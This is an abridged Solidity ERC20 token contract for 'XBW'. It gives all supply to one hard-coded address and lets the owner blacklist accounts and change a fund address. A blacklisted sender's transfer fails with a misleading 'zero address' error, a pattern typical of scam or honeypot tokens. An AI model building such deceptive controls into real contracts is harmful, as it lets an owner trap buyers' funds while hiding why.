...
contract kingToken is Context, IERC20, Ownable {
    ...
    string private _name = 'XBW';
    string private _symbol = 'XBW';
    uint8 private _decimals = 18;
    
    address private _burnPool = 0x000000000000000000000000000000000000dEaD;
    
    address private fundAddress = address(0x547FF98A966bB2c3B060D9eE6fe10bF4d44B5f6a);
    ...
    constructor () public {
        _rOwned[0x63C93bAF72a7C28a8BBb0C08D49f64b51221FFef] = _rTotal;
        
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[0x63C93bAF72a7C28a8BBb0C08D49f64b51221FFef] = true;

        
        emit Transfer(address(0), 0x63C93bAF72a7C28a8BBb0C08D49f64b51221FFef, _tTotal);
    }
    ...
    function inBlackList(address account) external onlyOwner{
    ...
    function setf(address account) external onlyOwner{
        fundAddress = account;
    }
  ...
  function setMaxStopFeeTotal(uint256 total) public onlyOwner {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        require(!_isBlackList[sender], "ERC20: transfer to the zero address");
